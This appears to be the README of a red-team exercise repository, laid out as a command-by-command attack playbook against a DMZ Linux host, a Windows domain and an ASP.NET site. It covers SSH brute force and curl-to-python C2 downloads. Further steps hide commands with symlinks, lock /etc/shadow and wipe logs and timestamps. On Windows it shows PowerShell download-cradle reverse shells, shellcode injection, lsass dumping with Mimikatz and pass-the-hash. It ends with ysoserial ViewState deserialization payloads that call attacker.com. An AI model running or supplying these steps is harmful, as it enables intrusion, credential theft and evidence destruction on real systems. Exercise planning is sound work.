# CS2020 repository

#### MSEL concepts:
##### Authenticated C2 via ICMP on Linux and Windows
##### Fallback channels using hardcoded IPs and calculated subnets
##### Proxied lateral movement using PTT/PTH via WMI, RPC/DCOM, SMB, and WinRM 
##### Defense evasion using in-memory payloads, encryption, timestamp modification, and byte randomization
##### Credential access using Mimikittenz, Mimikatz, Minidump, Rubeus, and InternalMonologue
##### Privilege escalation using process injection, parent process spoofing, and token theft

###### DMZ
```txt
# initial access
proxychains hydra -L ~/users.txt -P ~/passwords.txt <IP> ssh -u -V;
ssh <USER>@<IP>

# on penetration, backup C2 and proxy
nohup curl --insecure -sv https://<IP>/c2_http_basic_server.py|python - & disown
nohup curl --insecure -sv https://<IP>/c2_python_proxy_server.py|python - & disown
ssh -f -N -D <IP>:65535 root@localhost

# edit proxychains.conf
localnet 127.0.0.0/255.0.0.0
socks4 <IP> <PORT> <PASSWORD>

# maintaining access, root user and SSH
# passwd root (out of scope)
adduser <c2_NAME>
usermod -aG sudo <c2_NAME>
ssh-keygen -t rsa

# proxy via icmp
echo 1> /proc/sys/net/ipv4/icmp_echo_ignore_all 
nohup curl --insecure -sv https://<IP>/IcmpTunnel_S.py|python - & disown
# local icmp tunnel
python IcmpTunnel_C.py <IP> <TARGETIP> <TARGETPORT>

# icmp elf shell
sysctl -w net.ipv4.icmp_echo_ignore_all=1
curl --insecure https://<IP>/icmp_basic_server -o c2_icmp_basic_server && chmod +x c2_icmp_basic_server

# post exploitation
curl --insecure -sv https://<IP>/redghost.sh| bash -
mkdir /bin/.usr/ && cd /bin/.usr/ && curl --insecure https://<IP>/bash_hide.sh -o c2_bash_hide.sh && chmod +x c2_bash_hide.sh

# edit c2_bash_hide.sh
THINGTOHIDE=c2

# edit ~/.bashrc's
PATH=/bin/.usr/:${PATH}
# file located in first path /bin/.usr/c2_bash_hide.sh 
for f in "netstat" "iptables" "kill" "ps" "pgrep" "pkill" "ls" "rm" "rmdir" "passwd" "shutdown" "chmod" "sudo" "su" "cat" "useradd" "id" "ln" "unlink" "which" "gpasswd" "bash" "sh" "env" "echo" "history" "tcpdump" "chattr" "lsattr" "export" "mv" "grep" "egrep" "find"; do 
	ln -s /bin/.usr/c2_bash_hide.sh /bin/.usr/${f};
done;

# lock files, keep password, encrypt 
for f in "~/.bashrc" "/bin/.usr/c2_bash_hide.sh"  "/etc/shadow" "/etc/group" "/etc/sudoers" "/root/.ssh/id_rsa*" "/<c2_NAME>/.ssh/id_rsa*"; do 
  chattr +i ${f};
done;
openssl enc -aes-256-cbc -salt -pbkdf2 -in chattr -out chattr.tmp -k <PASSWORD> & mv chattr.tmp chattr;

# clear timestamps and logs
for f in `find /var/log/ -type f -name "*" 2>/dev/null`; do
  echo "" > ${f} 2>&1> /dev/null;
done;
for f in `find / -type f -name "*" 2>/dev/null`; do
  touch ${f} 2>&1> /dev/null;
done;
history -c && echo "" > ~/.bash_history
```

###### GREYZONE
```txt
# initial access
proxychains ruler --domain <TARGET> --insecure brute --users ~/users.txt --passwords ~/passwords.txt --delay 0 --verbose

# edit /tmp/command.txt
CreateObject("Wscript.Shell").Run "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))", 0, False

# reverse shell
proxychains ruler --email <USER>@<TARGET> form add --suffix superduper --input /tmp/command.txt --rule --send

# on penetration from icmp c2
Survey 
InstallWMIPersistence <EventFilterName> <EventConsumerName>
SetFallbackNetwork <PAddress> <subnetMask>
invoke_file /tmp/socks_proxy_server.ps1
iex(new-object net.webclient).downloadstring('<URL>socks_proxy_server.ps1')

# edit proxychains.conf
socks4 <IP> <PORT>

# maintaining access from icmp c2, migrate to explorer etc..
InstallPersistence 1
InstallPersistence 2
InstallPersistence 3
GetProcess
invoke_file /tmp/InjectShellcode.ps1
msfvenom -a x64 --platform windows -p windows/x64/exec cmd="powershell \"iex(new-object net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1')\"" -f  powershell;
Inject-Shellcode -Shellcode $buff ParentID <TARGETPID> -QueueUserAPC

# downgrade for DES hash, crack DES for NTLM
invoke_file /tmp/Get-Hash.ps1
Get-Hash

# lsass mini-dump for NTLM or plaintext
invoke_file /tmp/Out-Minidump.ps1
Get-Process lsass| Out-Minidump -DumpFilePath C:\temp
download c:\temp\lsass_<PID>.dmp 
SecureDelete c:\temp\lsass_<PID>.dmp 
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonPasswords full

# lsa secrets for NTLM
invoke_file /tmp/Invoke-PowerDump.ps1
Invoke-PowerDump

# post exploitation
proxychains evil-winrm -i <IP> -u <USER> -H <NTLMHASH> -s ./modules -e ./modules -P 5985;
Bypass-4MSI
proxychains wmiexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
proxychains dcomexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
proxychains atexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
proxychains smbexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
proxychains secretsdump.py -no-pass -hashes :<NTLMHASH> -outputfile <IP>_secrets.txt <DOMAIN>/<USER>@<IP>;

# clear logs
foreach($log in (get-eventlog -list|foreach-object {$_.log})){
	clear-eventlog -logname $_;
}
```

###### EXTERNAL .NET SITE
```txt
# grab viewstate info
curl -sv http:<URL>/Content/Default.aspx 2>&1|egrep "__VIEWSTATE|__VIEWSTATEENCRYPTED|__VIEWSTATEGENERATOR|__EVENTVALIDATION" > viewstate.txt &

# test case: 1 – enableviewstatemac=false and viewstateencryptionmode=false
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))"

# test case: 2 – .net < 4.5 and enableviewstatemac=true & viewstateencryptionmode=false
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <BASE64VIEWSTATE> --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=<VIEWSTATEGENERATOR> --macdecode --legacy

ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=<VIEWSTATEGENERATOR> --validationalg="SHA1" --validationkey="<VALIDATIONKEY>"

# test case: 3 – .net < 4.5 and enableviewstatemac=true/false and viewstateencryptionmode=true, remove __VIEWSTATEENCRYPTED
curl -sv 'http://<URL>/Content/default.aspx' \  
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  --data-raw '__EVENTTARGET=ddlReqType&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=<VIEWSTATEBASE64>&__VIEWSTATEGENERATOR=<VIEWSTATEGENERATOR>&__EVENTVALIDATION=<VALIDATIONBASE64>&ddlReqType=Create' 2>&1|egrep -i "validation of viewstate mac failed|may be encrypted"

# test case: 4 – .net >= 4.5 and enableviewstatemac=true/false and viewstateencryptionmode=true/false except both attribute to false
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <BASE64VIEWSTATE> --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="<DECRYPTIONKEY>"  --validationalg="SHA1" --validationkey="<VALIDATIONKEY>"

# exploitation example
curl -sv 'http://<URL>/Content/default.aspx' \  
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  --data-raw '__EVENTTARGET=ddlReqType&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=<URLENCODEDPAYLOAD>&__VIEWSTATEGENERATOR=<VIEWSTATEGENERATOR>&__EVENTVALIDATION=<VALIDATIONBASE64>&ddlReqType=Create' 2>&1

```
